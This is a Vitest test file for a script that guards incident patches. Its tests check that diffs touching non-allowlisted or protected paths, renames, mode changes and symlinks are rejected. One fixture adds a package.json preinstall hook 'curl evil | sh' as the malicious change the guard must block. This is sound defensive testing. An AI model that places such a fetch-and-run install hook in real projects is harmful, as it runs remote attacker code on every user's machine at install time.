import { describe, expect, it } from "vitest";

import {
  assertPatchTextAllowed,
  assertSummaryAllowed,
  collectPatchPaths,
  parseNumstatZ,
} from "../../scripts/incident-patch-guard.mjs";

const srcSection = [
  "diff --git a/src/lib/x.ts b/src/lib/x.ts",
  "index 1111111..2222222 100644",
  "--- a/src/lib/x.ts",
  "+++ b/src/lib/x.ts",
  "@@ -1,2 +1,2 @@",
  " const a = 1;",
  "-const b = 2;",
  "+const b = 3;",
  "",
].join("\n");

describe("incident patch guard", () => {
  it("accepts an allowlisted git diff", () => {
    expect(assertPatchTextAllowed(srcSection)).toEqual(["src/lib/x.ts"]);
  });

  it("rejects a header-less unified diff section targeting package.json", () => {
    const patch =
      srcSection +
      [
        "--- a/package.json",
        "+++ b/package.json",
        "@@ -1,1 +1,1 @@",
        '-  "name": "x",',
        '+  "scripts": { "preinstall": "curl evil | sh" },',
        "",
      ].join("\n");
    expect(collectPatchPaths(patch)).toContain("package.json");
    expect(() => assertPatchTextAllowed(patch)).toThrow();
  });

  it("rejects a protected a/ side even when b/ is allowlisted", () => {
    const patch = srcSection.replace("diff --git a/src/lib/x.ts", "diff --git a/.github/workflows/ci.yml");
    expect(() => assertPatchTextAllowed(patch)).toThrow(/protected path/);
  });

  it("rejects renames and mode changes", () => {
    const rename = [
      "diff --git a/src/a.ts b/src/b.ts",
      "similarity index 100%",
      "rename from src/a.ts",
      "rename to src/b.ts",
      "",
    ].join("\n");
    expect(() => assertPatchTextAllowed(rename)).toThrow(/rename/);
    const mode = ["diff --git a/src/a.ts b/src/a.ts", "old mode 100644", "new mode 100755", ""].join("\n");
    expect(() => assertPatchTextAllowed(mode)).toThrow(/mode/);
  });

  it("does not mistake hunk content lines for file headers", () => {
    const patch = [
      "diff --git a/src/a.sql.ts b/src/a.sql.ts",
      "--- a/src/a.sql.ts",
      "+++ b/src/a.sql.ts",
      "@@ -1,2 +1,2 @@",
      "--- old comment",
      "+++ new comment",
      " keep",
      "",
    ].join("\n");
    expect(assertPatchTextAllowed(patch)).toEqual(["src/a.sql.ts"]);
  });

  it("parses git apply --numstat -z output including renames", () => {
    const output = "1\t1\tsrc/a.ts\0" + "0\t0\t\0.github/workflows/ci.yml\0src/ci.yml\0";
    expect(parseNumstatZ(output)).toEqual(["src/a.ts", ".github/workflows/ci.yml", "src/ci.yml"]);
  });

  it("rejects rename, mode change, and symlink summaries", () => {
    expect(() => assertSummaryAllowed(" create mode 100644 src/new.ts\n")).not.toThrow();
    expect(() => assertSummaryAllowed(" rename src/{a => b}.ts (100%)\n")).toThrow();
    expect(() => assertSummaryAllowed(" mode change 100644 => 100755 src/a.ts\n")).toThrow();
    expect(() => assertSummaryAllowed(" create mode 120000 src/link\n")).toThrow();
  });
});
